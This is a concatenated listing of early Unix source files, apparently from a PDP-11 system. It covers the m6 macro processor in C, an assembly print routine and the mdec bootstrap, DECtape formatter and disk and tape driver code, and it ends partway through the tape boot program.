	mov	(r4)+,r1
	jsr	pc,1f
	br	prbuf
1:
	mov	r1,-(sp)
	beq	1f
	ash	$-3,r1
	bic	$!17777,r1
	jsr	pc,1b
1:
	mov	(sp)+,r0
	bic	$!7,r0
	add	$'0,r0
	movb	r0,(r3)+
	rts	pc

float:
	mov	ndfnd,r2
	jsr	pc,pfloat
	br	prbuf

scien:
	mov	ndfnd,r2
	jsr	pc,pscien
	br	prbuf

prbuf:
	cmp	r3,sp
	blos	1f
	tstb	-1(r3)
	bne	1f
	dec	r3
	br	prbuf
1:
	mov	sp,r2
	mov	r4,-(sp)
	mov	$' ,-(sp)
	mov	width,r1
	sub	r3,r1
	clrb	(r3)+
	add	r2,r1
	mov	r1,spaces
	ble	1f
	tst	rjust
	bne	1f
2:
	jsr	pc,*$_IEH3revp
	dec	spaces
	bne	2b
1:
	mov	r2,bufp
1:
	movb	*bufp,(sp)
	beq	1f
	inc	bufp
	jsr	pc,*$_IEH3revp
	br	1b
1:
	tst	spaces
	ble	1f
	tst	rjust
	beq	1f
	mov	$' ,(sp)
2:
	jsr	pc,*$_IEH3revp
	dec	spaces
	bne	2b
1:
	tst	(sp)+
	mov	(sp)+,r4
	jmp	loop

gnum:
	clr	ndfnd
	clr	r1
1:
	movb	*formp,r0
	inc	formp
	sub	$'0,r0
	cmp	r0,$9.
	bhi	1f
	inc	ndfnd
	mul	$10.,r1
	add	r0,r1
	br	1b
1:
	add	$'0,r0
	mov	r1,*(r3)+
	rts	r3

	.bss
ndigix:	.=.+2
width:	.=.+2
formp:	.=.+2
rjust:	.=.+2
ndfnd:	.=.+2
bufp:	.=.+2
spaces:	.=.+2
-- /usr/source/iolib/wdleng.c mode=0100664 uid=3 gid=3 atime=174921365 mtime=169260203 --
wdleng ()
/* returns number of bits in a machine integer */
/* written so kernighan can tell where he is running */
{
int k, leng;
k = leng = 1;
while (k =<< 1)
	leng++;
return (leng);
}
-- /usr/source/m6 mode=0140775 uid=3 gid=3 atime=174930094 mtime=174922240 --
-- /usr/source/m6/m6.h mode=0100664 uid=3 gid=3 atime=174922213 mtime=174845206 --

struct { 
	int word; 
};

struct {		/*"put stack", currently gathering args*/
	int prev;	/*previous frame ptr, self-relative*/
	int pan;	/*argument number of arg being collected*/
	int pa0;	/*self-relative ptr oo arg0*/
#define pend 6
};

struct {		/*"get stack", currently expanding macros*/
	int prev;	/* prev frame ptr, self-realtive*/
	int mframe;	/* ptr to macro definition frame*/
	int mchar;	/* next char relative to def. frame*/
	int marg;	/* 0 or ptr to next arg char reltive to gf*/
	int ga0;	/* arg0 ptr self-rel*/
};

struct {		/*"definition stack"*/
	int prev;	/* prev frame ptr, self-relative*/
	int dswitch;	/* builtin func code, neg for dead definition*/
	int dtext;	/* definition text prt rel to df*/
	int dident;	/* first char of identifier naming def*/
#define dend 6
};

char metas[];
#define lquote metas[0]
#define rquote metas[1]
#define sharp metas[2]
#define colon metas[3]
#define semi metas[4]
#define comma metas[5]
#define dollar metas[6]
#define NMETA 7

char one[];
int rescan;
int traceflag;
int trashflag;		/* nonzero when dead def'n exist*/

int lp;			/* arg collection level (out level)*/
int lg;			/*input level (get level) */
int lq;		/*quote level*/
int l9;			/*apparent call level within arg 9*/

char c;			/*current input character*/

char *pf;		/*put stack frame ptr*/
char *pe;		/*put stack end*/
char *pmax;		/*top of put stack*/
char p0[];		/*put stack*/

char *gf;		/*get stack frame ptr*/
char *ge;		/*get stack end*/
char *gmax;		/*get stack limit*/
char g0[];		/*get stack*/

char *df;		/*definition stack frame ptr*/
char *de;		/*def stack end*/
char *dmax;		/*def stack limit*/
char d0[];		/*def stack*/

char dummy[];		/*dummy empty macro*/
-- /usr/source/m6/m61.c mode=0100664 uid=3 gid=3 atime=174922179 mtime=174845159 --
#

#include "m6.h"

main(argc,argv)
char **argv; 
{
	extern fin;
	int t;
	gf = ge = g0;
	pf = pe = p0;
	t = g0; 
	gmax =+ t-10;
	t = d0; 
	dmax =+ t-10;
	t = p0; 
	pmax =+ t-10;
	revptr(d0,d0+2,&df,&de);
	if(argc>1) {
		fin = open(argv[1],0);
		control();
		close(fin); 
	}
	fin = dup(0);
	control();  
}


diag(m) {
	printf("%s\n",m);
	iot(); 
}	/* abort */

int iot 4;

-- /usr/source/m6/m62.c mode=0100664 uid=3 gid=3 atime=174922184 mtime=174845163 --
#

#include "m6.h"

control() {

	while(1) {
		get();
		if(c==0 && lg>0)  {
			popget(); 
			trash(); 
			rescan = 1; 
		}
		else {
			if(!rescan) put();
			else if(lq>0) {
				if(c==lquote) {
					lq++; 
					put(); 
				}
				else if(c==rquote || c==0)  {
					lq--;
					if(lq>0 || l9>0) put (rquote); 
				}
				else put(); 
			}
			else if(l9>0) 
				if(c==colon||c==0||c==semi) 
					if(--l9<=0) endcall();
					else put();
				else {
					if(c==sharp) l9++;
					else if(c==lquote) lq++;
					put(); 
				}
			else {
				if(c==sharp) begincall();
				else if(c==lquote) lq++;
				else if(lp>0) {
					if(c==colon||c==0||c==semi) endcall();
					else if(c==comma) newarg();
					else put(); 
				}
				else if(c==0) return;	/* lg=lp=lq=0 */
				else put(); 
			} 
		} 
	} 
}

endcall() {
	char *pt, *p;
	rescan = c!=semi;
	newarg();
	pushget();
	pt = &pf->pa0;
	ge = move(pt,&gf->ga0,pe-pt);
	if(ge>gmax) diag("Call stack overflow");
	if(traceflag) dotrace();
	p = finddef(0);
	setscan(p);
	popput();
	lp--;
	function(p->dswitch); 
}

begincall() {
	lp++;
	pushput();
	pe = pf+pend;
	pf->pan = pf->pa0 = 0;
}

newarg() {
	char *p;
	if(++pf->pan>=9) if(c==comma) l9++;
	*pe++ = 0;
	pe = (pe+1)&0177776;
	p = &pf->pa0;
	while(p->word!=0) p =+ p->word;
	p->word = pe - p;
	*pe++ = *pe++ = 0; 
}

setscan(p) 
char *p;
{
	gf->mchar = (gf->mframe = p)->dtext;
	gf->marg = 0; 
}
-- /usr/source/m6/m63.c mode=0100664 uid=3 gid=3 atime=174922192 mtime=174845168 --
#

#include "m6.h"

char *
finddef(n) {
	char *p;
	if((p = lookup(arg(n)))==0)
		if((p = lookup(""))==0) diag("Software error");
	return(p); 
}

char *
lookup(s) {
	char *dt;
	dt = df;
	while(dt>d0) {
		if(dt->dswitch>=0 && comp(s,&dt->dident)) return(dt);
		dt =+ dt->prev; 
	}
	return(0); 
}

comp(s,t) 
char *s, *t; 
{
	for(;*s++ == *t;t++)
		if(*t==0) return(1);
	return(0); 
}

remove(n) {
	char *p;
	if(p = lookup(arg(n))) if(p>d0+2) {
		trashflag++;
		p->dswitch = -1; 
	} 
}

trash() {
	char *p,*q,*r;
	if(lg>0) return;
	while(df->dswitch<0) {
		de = df;
		df =+ df->prev;
		trashflag--; 
	}
	if(trashflag<=0) return;
	de = (de+1)&0177776;
	revptr(de,df,&p,&q);
	q = p;
	for(;p->word!=0;p=+r->word) {
		r = p;
		if(p->dswitch>=0) {
			r = q;
			q = move(p,q,p->word); 
		} 
	}
	q->word = 0;
	revptr(d0,d0+2,&df,&de); 
}


revptr(p,q,np,nq) 
char *p, *q, **np, **nq;
{
	int t;
	p->word = 0;
	while((t = q->word)!=0) {
		q->word = p-q; 
		p = q; 
		q =+ t;
		if(q<d0 || q>dmax) diag("Software error"); 
	}
	*np = p;
	*nq = q; 
}

char *
move(from,to,count) 
char *from, *to;
{
	while(count-->0) *to++ = *from++;
	return(to); 
}
-- /usr/source/m6/m64.c mode=0100664 uid=3 gid=3 atime=174922199 mtime=174845172 --
#

#include "m6.h"

pushget() {
	ge = (ge+1)&0177776;
	ge->word = gf-ge; 
	gf = ge; 
	ge =+2;
	++lg;
}

dotrace() {
	char *arg();
	int i,j;
	printf("\n%d %c%s",lg,sharp,arg(0));
	for(j=9;j>0&&*arg(j)==0;j--);
	for(i=1;i<=j;i++)
		printf("%c%c%s%c",comma,lquote,arg(i),rquote);
	printf("%c\n",c); 
}

popget() {
	ge = gf; 
	gf =+ gf->word;
	--lg;
	if(gf<g0) diag("Software error"); 
}

pushput() {
	if(pe&1) {
		pf->prev =| 1;
		pe++; 
	}
	pe->word = pf-pe; 
	pf = pe; 
	pe =+2;
}

popput() {
	pe = pf; 
	pf =+ pf->word;
	if(pf->prev&1) {
		pe--;
		pf->prev =& 0177776; 
	}
	if(pf<p0) diag("Software error"); 
}

pushdef() {
	de = (de+1)&0177776;
	de->word = df-de; 
	df = de; 
	de =+2;
}

put() {
	if(lp>0) {
		*pe++ = c; 
		if(pe>pmax) diag("Arg collection overflow"); 
	}
	else putchar(c); 
}

get() {
	char *p;
	int n;
	if(lg==0) 
		c = getchar();
	else while(1) {
		if(gf->marg!=0) {
			if((c = gf[gf->marg++])==0) gf->marg = 0;
			else return; 
		}
		c = (p = gf->mframe)[gf->mchar++];
		if(c!=dollar) return;
		n = p[gf->mchar] - '0';
		if(n<0 || n>9) return;
		++gf->mchar;
		gf->marg = arg(n) - gf; 
	}
}
-- /usr/source/m6/m65.c mode=0100664 uid=3 gid=3 atime=174922207 mtime=174845177 --
#

#include "m6.h"

define() {
	remove(1);
	newdef(decbin(3));
	setdef(arg(1),arg(2)); 
}

newdef(n) {
	pushdef();
	de = &df[df->dtext = dend]; 
	if((df->dswitch = n)<0) trashflag++;
}

setdef(s1,s2) {
	copydef(s1);
	df->dtext = de -df;
	copydef(s2); 
}

copydef(s) 
char *s; 
{
	while(*de++ = *s++)
		if(de>dmax) diag("Definition table overflow"); 
}

char *
arg(n) {
	char *p;
	p = &gf->ga0;
	while(--n>=0 && p->word!=0) p =+ p->word;
	return(p->word!=0?p+2:p); 
}

function(n) {
	if(n==0) ;
	else if(1<=n && n<=13) binop(n);
	else {
		switch(n) {
		case 20: 
			doif(); 
			return;
		case 21: 
			define(); 
			return;
		case 22: 
			copy(); 
			return;
		case 23: 
			meta(); 
			return;
		case 24: 
			size(); 
			return;
		case 25: 
			substr(); 
			return;
		case 26: 
		case 27: 
			go(n); 
			return;
		case 28: 
			remove(1); 
			return;
		case 29: 
			dnl(); 
			return;
		case 32: 
			quote(); 
			return;
		case 33: 
			result(finddef(1)->dswitch); 
			return;
		case 34: 
			list(); 
			return;
		case 35: 
			traceflag = comp(arg(1),one); 
			return;
		}
	} 
}
-- /usr/source/m6/m66.c mode=0100664 uid=3 gid=3 atime=174922214 mtime=174845181 --
#

#include "m6.h"


doif() {
	int i;
	int *p;
	char *arg();
	i = 1;
	while(!comp(arg(i),one)) if((i =+ 2)>8) return;
	p = arg(i+1) - 2;
	ge = move(p,&gf->ga0,p->word+1);
	setscan(dummy); 
}

bindec(n) {
	if(n == 0) return;
	bindec(n/10);
	*ge++ = (n%10) + '0'; 
}

result(n) {
	char *p;
	setscan(dummy);
	ge = 2 + (p = &gf->ga0);
	if(n<0) {
		*ge++ = '-'; 
		n = -n; 
	}
	if(n==0) *ge++ = '0'; 
	else bindec(n);
	*ge++ = 0; 
	ge = (ge+1)&0177776;
	p->word = ge - p;
	*ge++ = *ge++ = 0; 
}

binop(code) {
	int r1,r2;
	int r,t;
	int arg1, arg2;
	arg1 = decbin(1);
	arg2 = decbin(2);
	if(code < 7)	/* relationals */
		result((code & ((arg1<arg2)?4:(arg1==arg2)?2:1)) != 0);
	else if(code < 9) 	/* seq=7 sne=8 */
		result((code==7)==comp(arg(1),arg(2)));
	else switch (code) {
	case 9: 
		result(arg1+arg2); 
		return;
	case 10: 
		result(arg1-arg2); 
		return;
	case 11: 
		result(arg1*arg2); 
		return;
	case 12: 
		result(arg1/arg2);
		if(arg2==0) gf->ga0 = 0; 
		return;
	case 13:	/* exp */
		r = 1;
		while(arg2-->0) r =* arg1;
		result(r);
		if(arg2<-1) gf->ga0 = 0; 
	} 
}

decbin(i) {
	char *s;
	char t;
	int n;
	if(t = (*(s = arg(i))=='-')) s++;
	n = 0;
	while(*s>='0' && *s<='9') n = 10*n + *s++ - '0';
	return(t?-n:n); 
}

dnl() {
	char d;
	d = 0;
	while(d=getchar()) if(d=='\n') return; 
}

quote() {
	char *p,*s;
	p = finddef(1);
	s = &p[p->dtext];
	while(c = *s++) put(); 
}

list() {
	int n,i;
	char *p;
	if((n=decbin(1))<=0) return;
	p = df;
	for(i=1;;) {
		if(p<=d0) return;
		if(p->dswitch>=0)
			if(i++>=n) break;
		p =+ p->prev; 
	}
	for(p = &p->dident;c = *p++;)
		put(); 
}

copy() {
	char *p;
	p = finddef(1);
	remove(2);
	newdef(p->dswitch);
	setdef(arg(2),p+p->dtext); 
}

go(n) {
	if(comp(arg(1),one)) {
		popget();
		if(lg>0)
			if(n==26) popget();
			else setscan(gf->mframe);	/* gobk=27 */
	}  
}

size() {
	int i;
	char *p;
	i = 0;
	p = arg(1);
	while(*p++ != 0) i++;
	result(i); 
}

meta() {
	char d;
	int i;
	char *arg();
	if((d = *arg(2))!=0) {
		for(i=0;i<NMETA;i++)
			if(metas[i]== *arg(1)) metas[i] = d; 
	}
}

substr() {
	char *s;
	int arg2,arg3;
	char *arg();
	newdef(-1);
	setscan(df);
	s = arg(1);
	arg2 = decbin(2);
	arg3 = *arg(3)==0?32767:decbin(3);
	if(arg2<1) { 
		arg3 =+ arg2-1; 
		arg2=1; 
	}
	while(--arg2>0 && *s!=0) s++;
	while(arg3-->0) {
		if((*de++ = *s++)==0) return;
		if(de>dmax) diag("No room for substr"); 
	}
	*de++ = 0; 
}
-- /usr/source/m6/m67.c mode=0100664 uid=3 gid=3 atime=174922223 mtime=174845184 --
#define PSIZE 1000
#define GSIZE 2000
#define DSIZE 5000

int pmax PSIZE;
char p0[PSIZE];

int gmax GSIZE;
char g0[GSIZE];

int dmax DSIZE;
char d0[DSIZE] {
	0,0,
	8,0,  0,0,  6,0,  0,0,	/*null*/
	12,0, 35,0, 11,0, 't','r','a','c','e',0,
	12,0, 23,0, 10,0, 'w','a','r','n',0,0,
	12,0, 22,0, 10,0, 'c','o','p','y',0,0,
	12,0, 32,0, 11,0, 'q','u','o','t','e',0,
	14,0, 33,0, 12,0, 's','e','r','i','a','l',0,0,
	12,0, 34,0, 10,0, 'l','i','s','t',0,0,
	12,0, 24,0, 10,0, 's','i','z','e',0,0,
	14,0, 25,0, 12,0, 's','u','b','s','t','r',0,0,
	10,0, 26,0, 8,0,  'g','o',0,0,
	12,0, 27,0, 10,0, 'g','o','b','k',0,0,
	10,0, 28,0, 9,0,  'd','e','l',0,
	10,0, 29,0, 9,0,  'd','n','l',0,
	10,0, 7,0,  9,0,  's','e','q',0,
	10,0, 8,0,  9,0,  's','n','e',0,
	10,0, 9,0,  9,0,  'a','d','d',0,
	10,0, 10,0, 9,0,  's','u','b',0,
	10,0, 11,0, 9,0,  'm','p','y',0,
	10,0, 12,0, 9,0,  'd','i','v',0,
	10,0, 13,0, 9,0,  'e','x','p',0,
	10,0, 1,0,  8,0,  'g','t',0,0,
	10,0, 2,0,  8,0,  'e','q',0,0,
	10,0, 3,0,  8,0,  'g','e',0,0,
	10,0, 4,0,  8,0,  'l','t',0,0,
	10,0, 5,0,  8,0,  'n','e',0,0,
	10,0, 6,0,  8,0,  'l', 'e',0,0,
	10,0, 21,0, 9,0,  'd','e','f',0,
	10,0, 20,0, 8,0,  'i','f',0,
	0,0
};

int dummy[] {
	0,
	0,
	6,
	'$0',
	0
};
char metas[] {
	'<',
	'>',
	'#',
	':',
	';',
	',',
	'$'
};

int rescan 1;
int traceflag 0;
int trashflag 0;
char one[] { 
	'1',0 };
-- /usr/source/m6/run mode=0100664 uid=3 gid=3 atime=174922238 mtime=174917276 --
cc -s -O m6?.c
cmp a.out /usr/bin/m6
cp a.out /usr/bin/m6
rm a.out *.o
-- /usr/source/mdec mode=0140775 uid=3 gid=3 atime=174930099 mtime=174929199 --
-- /usr/source/mdec/dldr.s mode=0100664 uid=3 gid=3 atime=174929158 mtime=173058208 --
/ copy and execute DEC loaders

core = 24.
prs = 177550

	mov	$dldr,r0
	mov	$[core*2048.]-300,r1
	mov	r1,r2
1:
	mov	(r0)+,(r1)+
	cmp	r0,$end
	blo	1b
	jmp	(r2)

dldr:
	10706
	24646
	10705
	62705
	114
	5001
	13716
	177570
	6016
	103402
	5016
	404
	241
	6116
	1001
	10116
	5000
	4715
	105303
	1374
	4715
	4767
	74
	10402
	162702
	4
	22702
	2
	1441
	4767
	54
	61604
	10401
	4715
	2004
	105700
	1753
	0
	751
	110321
	770
	16703
	150
	105213
	105713
	100376
	116303
	2
	60300
	42703
	177400
	5302
	207
	12667
	44
	4715
	10304
	4715
	303
	50304
	16707
	26
	4767
	177752
	4715
	105700
	1342
	6204
	103002
	0
	677
	6304
	114
	0

. = dldr-500+744
	16701
	26
	12702
	352
	5211
	105711
	100376
	116162
	2
	[core*2048.]-400
	5267
	177756
	765
	prs
end:
-- /usr/source/mdec/dtf.s mode=0100664 uid=3 gid=3 atime=174928990 mtime=173058208 --
/ unix DEC-tape time/mtrack track formatter

nword = 256.
nblock = 578.
endz = 7200.

ps = 177776
tcst = 177340
tccm = 177342
tcwc = 177344
tcba = 177346
tcdt = 177350

	mov	r5,savr5
	mov	sp,savsp

start:
	mov	savr5,r5
	mov	savsp,sp
	jsr	pc,4(r5)
		<set up to format on drive 0\n\0>
		.even

	clr	r0
	mov	$cobtab,r1
1:
	jsr	pc,bcomobv
	mov	r2,(r1)+
	inc	r0
	cmp	r0,$512.
	bne	1b

	mov	$buffer,r0
1:
	mov	$-1,(r0)+
	cmp	r0,$buffer+nword+nword
	blo	1b

	mov	savr5,r5
	jsr	pc,2(r5)

	mov	$340,ps
	mov	$tcdt,r5
	mov	$13,tccm
	jsr	pc,flag

/ 8Kch for end zone

	mov	$endz,r4
1:
	jsr	r0,mtrack; 101101
	dec	r4
	bne	1b

/ foreward guard

	mov	$199.,r4
1:
	jsr	r0,mtrack; 10101
	dec	r4
	bne	1b

/ blocks

	mov	$nblock,r3
1:
	jsr	r0,mtrack; 10101
	jsr	r0,mtrack; 10110
	jsr	r0,mtrack; 11010
	jsr	r0,mtrack; 01000
	jsr	r0,mtrack; 01000
	jsr	r0,mtrack; 01000
	jsr	r0,mtrack; 01000
	mov	$nword-4,r4
2:
	jsr	r0,mtrack; 111000
	dec	r4
	bne	2b
	jsr	r0,mtrack; 111011
	jsr	r0,mtrack; 111011
	jsr	r0,mtrack; 111011
	jsr	r0,mtrack; 111011
	jsr	r0,mtrack; 101001
	jsr	r0,mtrack; 100101
	jsr	r0,mtrack; 10101
	dec	r3
	bne	1b

/ rear guard

	mov	$199.,r4
1:
	jsr	r0,mtrack; 10101
	dec	r4
	bne	1b

/ rear end zone

	mov	$endz,r4
1:
	jsr	r0,mtrack; 10010
	dec	r4
	bne	1b
	clr	tccm

/ end of mtrack pass
/ go back 12 blocks

	mov	$12.,r0
	mov	$4002,tccm
1:
	incb	tccm
	jsr	pc,flag
	dec	r0
	bne	1b

/ put comobv(nblock-1) in everything
/ up to end zone

	mov	$nblock-1,r0
	mov	r0,bn
	jsr	pc,comobv
	mov	$17,tccm
	jsr	pc,flag
1:
	movb	r1,tcst
	mov	r0,(r5)
	jsr	pc,flag1
		br 1b

/ reverse pass put in
/ foreward and reverse
/ block numbers

	mov	$4017,tccm
	jsr	pc,flag
1:
	mov	$nword+3.,r4
2:
	clrb	tcst
	clr	(r5)
	jsr	pc,flag
	dec	r4
	bne	2b

	clrb	tcst
	clr	(r5)
	mov	bn,r0
	jsr	pc,comobv
	jsr	pc,flag
	movb	r1,tcst
	mov	r0,(r5)
	jsr	pc,flag
	dec	bn
	blt	check
	clrb	tcst
	clr	(r5)
	jsr	pc,flag
	clrb	tcst
	clr	(r5)
	jsr	pc,flag
	clrb	tcst
	mov	bn,(r5)
	jsr	pc,flag
	clrb	tcst
	clr	(r5)
	jsr	pc,flag
	clrb	tcst
	clr	(r5)
	jsr	pc,flag
	br	1b

/ foreward pass
/ confirm block numbers
/ write all 1's in data

check:
	clrb	tcst
	clr	(r5)
	jsr	pc,flag1
		br check
	clr	r4
1:
	mov	$3,tccm
	jsr	pc,flag
	cmp	(r5),r4
	bne	error1
	mov	$-nword,tcwc
	mov	$buffer,tcba
	mov	$15,tccm
	jsr	pc,flag
	inc	r4
	cmp	r4,$nblock
	bne	1b
	mov	$3,tccm
	jsr	pc,flag1
		br error2

/ reverse pass
/ confirm block numbers
/ read data and compare
/ to all 1's

1:
	mov	$4003,tccm
	jsr	pc,flag
	dec	r4
	cmp	r4,(r5)
	bne	error3
	mov	$-nword,tcwc
	mov	$buffer,tcba
	mov	$4005,tccm
	jsr	pc,compare
	jsr	pc,flag
	tst	r4
	bne	1b
	mov	$4003,tccm
	jsr	pc,flag1
		br error4
	jsr	pc,compare
	jmp	start

error1:
	mov	$1,r0
	br	1f
error2:
	mov	$1,r0
	br	1f
error3:
	mov	$3,r0
	br	1f
error4:
	mov	$4,r0
	br	1f
error5:
	mov	$5,r0
	br	1f
error6:
	mov	$6,r0
	br	1f
error7:
	mov	$7,r0
1:
	add	$'0,r0
	movb	r0,0f
	mov	tcst,-(sp)
	mov	tccm,-(sp)
	mov	$1,tccm
	mov	savr5,r5
	jsr	pc,4(r5)
		<error>
0:
		<x\ntcst in r0; tccm in r1\n\0>
		.even
	mov	(sp)+,r1
	mov	(sp)+,r0
	0
	rts	pc

compare:
	mov	r0,-(sp)
	mov	$buffer,r0
1:
	cmp	(r0)+,$-1
	bne	error5
	cmp	r0,$buffer+nword+nword
	blo	1b
	mov	(sp)+,r0
	rts	pc

mtrack:
	mov	(r0)+,(r5)
	jsr	pc,flag
	rts	r0

flag:
	bit	$100200,tccm
	beq	flag
	blt	error6
	rts	pc

flag1:
	bit	$100200,tccm
	beq	flag1
	bge	1f
	tst	tcst
	bge	error7
	add	$2,(sp)
1:
	rts	pc

comobv:
	mov	r0,r4
	bic	$!777,r0
	asl	r0
	mov	cobtab(r0),r0
	swab	r0
	clr	r1
	ror	r0
	rol	r1
	asl	r0
	asl	r0
	rol	r1
	swab	r4
	bic	$177401,r4
	bis	cobtab(r4),r0
	rts	pc

bcomobv:
	mov	r0,r2
	bic	$!70,r2
	mov	r0,r3
	mov	$6.,r4
1:
	asr	r3
	dec	r4
	bne	1b
	bic	$!7,r3
	bis	r3,r2
	mov	r0,r3
	mov	$6.,r4
1:
	asl	r3
	dec	r4
	bne	1b
	bic	$!700,r3
	bis	r3,r2
	com	r2
	bic	$!777,r2
	rts	pc

bn:	.=.+2
savr5:	.=.+2
savsp:	.=.+2
cobtab:	.=.+1024.
buffer:	.=.+nword+nword

-- /usr/source/mdec/fsboot.s mode=0100664 uid=3 gid=3 atime=174929134 mtime=174929027 --
/ disk boot program to load and transfer
/ to a unix file system entry
/ must be assembled with tty.s and
/ appropriate disk driver

/ entry is made by jsr pc,*$0
/ so return can be rts pc

core = 24.	/ first core loc (in KW) not used
.. = [core*2048.]-512.
start:

/ copy self to 'core' - 512. bytes
/ strip of UNIX execute header if present

	mov	$..,sp
	mov	sp,r1
	clr	r0
	cmp	pc,r1
	bhis	2f
	cmp	(r0),$407
	bne	1f
	mov	$20,r0
1:
	mov	(r0)+,(r1)+
	cmp	r1,$core*2048.
	blo	1b
	jmp	(sp)

/ clear all of core

2:
	clr	(r0)+
	cmp	r0,sp
	blo	2b

/ prompt
/ read in path name
/ breaking on '/' into 14 ch names

	mov	$trvect,r5
	mov	$'@,r0
	jsr	pc,(r5)
	mov	$names,r2
1:
	mov	r2,r1
2:
	jsr	pc,getc
	cmp	r0,$'\n
	beq	1f
	cmp	r0,$'/
	beq	3f
	movb	r0,(r1)+
	br	2b
3:
	cmp	r2,r1
	beq	2b
	add	$14.,r2
	br	1b
1:

/ start of path name decoding
/ start with first name  and root ino

	mov	$names,r2
	mov	$1,r0

/ get next inode

1:
	clr	bno
	jsr	pc,iget
	tst	(r2)
	beq	1f

/ read next directory looking for next name

2:
	jsr	pc,rmblk
		br start
	mov	$buf,r1
3:
	mov	r2,r3
	mov	r1,r4
	add	$16.,r1
	tst	(r4)+
	beq	5f
4:
	cmpb	(r3)+,(r4)+
	bne	5f
	cmp	r4,r1
	blo	4b
	mov	-16.(r1),r0
	add	$14.,r2
	br	1b
5:
	cmp	r1,$buf+512.
	blo	3b
	br	2b

/ last entry was found
/ read into 0.

1:
	clr	r2
1:
	jsr	pc,rmblk
		br callout
	mov	$buf,r1
2:
	mov	(r1)+,(r2)+
	cmp	r1,$buf+512.
	blo	2b
	br	1b

/ subroutine will read in inode
/ number specified in r0
iget:
	add	$31.,r0
	mov	r0,r5
	ash	$-4.,r0
	jsr	pc,rblka
	bic	$!17,r5
	ash	$5.,r5
	add	$buf,r5
	mov	$inod,r4
1:
	mov	(r5)+,(r4)+
	cmp	r4,$addr+16.
	blo	1b
	rts	pc

/ routine to read in block
/ number specified by bno
/ after applying file system
/ mapping algorithm in inode.
/ bno is incremented, success
/ return is a skip, error (eof)
/ is direct return.
rmblk:
	add	$2,(sp)
	mov	bno,r0
	inc	bno
	bit	$LRG,mode
	bne	1f
	asl	r0
	mov	addr(r0),r0
	bne	rblka
2:
	sub	$2,(sp)
	rts	pc
/ large algorithm
/ huge algorithm is not implemented
1:
	clr	-(sp)
	movb	r0,(sp)
	clrb	r0
	swab	r0
	asl	r0
	mov	addr(r0),r0
	beq	2b
	jsr	pc,rblka
	mov	(sp)+,r0
	asl	r0
	mov	buf(r0),r0
	beq	2b
rblka:
	mov	r0,dska
	br	rblk

ba:	buf
wc:	-256.
.bss
end:
inod = ..-1024.
mode = inod
addr = inod+8.
buf = inod+32.
bno = buf+514.
dska = bno+2
names = dska+2
LRG = 10000
.text
-- /usr/source/mdec/hp.s mode=0100664 uid=3 gid=3 atime=174929177 mtime=173058208 --
/ rp04 disk driver

hpcs1 = 176700
hpda  = 176706
hpcs2 = 176710
hpof  = 176732
hpca  = 176734

fmt22 = 010000
preset = 021
clear = 040

first = .+2	/ dirty, but i need the space
	tst	$0
	bne	1f
	mov	$clear,*$hpcs2
	mov	$preset,*$hpcs1
	mov	$fmt22,*$hpof
	inc	first
1:
	mov	dska,r1
	clr	r0
	div	$22.,r0
	mov	r1,-(sp)
	mov	r0,r1
	clr	r0
	div	$19.,r0
	bisb	r1,1(sp)
	mov	r0,*$hpca
	mov	$hpda,r1
	mov	(sp)+,(r1)
	mov	ba,-(r1)
	mov	wc,-(r1)
	mov	$iocom,-(r1)
1:
	tstb	(r1)
	bpl	1b
	rts	pc
-- /usr/source/mdec/ht.s mode=0100664 uid=3 gid=3 atime=174929177 mtime=174929020 --
htcs1 = 172440
htba  = 172444
htfc  = 172446
htcs2 = 172450
htds  = 172452
httc  = 172472

P800 = 1300
P1600 = 2300
PIP = 20000
MOL = 10000
ERR = 40000
REV = 33
READ = 71
REW = 7

tread:
1:
	mov	ba,mtma
	cmp	mtapa,tapa
	beq	1f
	bhi	2f
	jsr	pc,rrec
	br	1b
2:
	jsr	pc,rew
	br	1b
1:
	mov	wc,r1
1:
	jsr	pc,rrec
	add	$256.,r1
	bmi	1b
	rts	pc

rrec:
	mov	$htds,r0
	tstb	(r0)
	bpl	rrec
	bit	$PIP,(r0)
	bne	rrec
	bit	$MOL,(r0)
	beq	rrec
	mov	$htfc,r0
	mov	$-512.,(r0)
	mov	mtma,-(r0)
	mov	$-256.,-(r0)
	mov	$READ,-(r0)
1:
	tstb	(r0)
	bpl	1b
	bit	$ERR,*$htds
	bpl	1f
	mov	$-1,*$htfc
	mov	$REV,(r0)
	br	rrec
1:
	add	$512.,mtma
	inc	mtapa
	rts	pc

rew:
	clr	*$htcs2
	mov	$P800,*$httc
	mov	$REW,*$htcs1
	clr	mtapa
	rts	pc

mtapa:	0
mtma:	0
-- /usr/source/mdec/mboot.s mode=0100664 uid=3 gid=3 atime=170471825 mtime=173058208 --
/ tape boot program to load and transfer
/ to a 'tp' entry

/ entry is made by jsr pc,*$0
/ so return can be rts pc
/ jsr pc,(r5) is putc
/ jsr pc,2(r5) is getc
/ jsr pc,4(r5) is mesg

core = 24.
.mt. = 1
.. = [core*2048.]-512.
start:
	mov	$..,sp
	mov	$name,r4
	mov	sp,r1
	cmp	pc,r1
	bhis	2f
	clr	r0
	cmp	(r0),$407
	bne	1f
	mov	$20,r0
1:
	mov	(r0)+,(r1)+
	cmp	r1,$end
	blo	1b
	jmp	(sp)

2:
	jsr	pc,rew
	mov	$tvec,r5
	mov	$'=,r0
	jsr	pc,(r5)
2:
	mov	r4,r1
1:
	jsr	pc,2(r5)
	cmp	r0,$'\n
	beq	1f
	cmp	r0,$'@
	beq	2b
	movb	r0,(r1)+
	cmp	r0,$'#
	bne	1b
	sub	$2,r1
	cmp	r1,r4
	blo	2b
	br	1b
1:
	clrb	(r1)
	cmp	r1,r4
	blos	start
	mov	$1,tapa
	mov	$-6144.,wc
	jsr	pc,taper
	clr	r1
1:
	mov	r1,r2
	mov	r4,r0
2:
	cmpb	(r0)+,(r1)
	bne	2f
	tstb	(r1)+
	bne	2b
	br	1f
2:
	mov	r2,r1
	add	$64.,r1
	cmp	r1,$12288.
	blo	1b
	jsr	pc,rew
	br	start
1:
	mov	44.(r2),tapa
	mov	38.(r2),r0
	inc	r0
	clc
	ror	r0
	neg	r0
	mov	r0,wc
	clr	r0
1:
	clr	(r0)+
	cmp	r0,sp
	blo	1b
	jsr	pc,taper
	jsr	pc,rew
	clr	r0
	cmp	(r0),$407		/ unix a.out?
	bne	2f
1:
	mov	20(r0),(r0)+
	cmp	r0,sp
	blo	1b
2:
	jsr	pc,*$0
	br	start

.if .mt.
mts = 172520
mtc = 172522
mtbrc = 172524
mtcma = 172526

taper:
	clr	mtma
	cmp	mtapa,tapa
	beq	1f
	bhi	2f
	jsr	pc,rrec
	br	taper
2:
	jsr	pc,rew
	br	taper
1:
	mov	wc,r1
1:
	jsr	pc,rrec
	add	$256.,r1
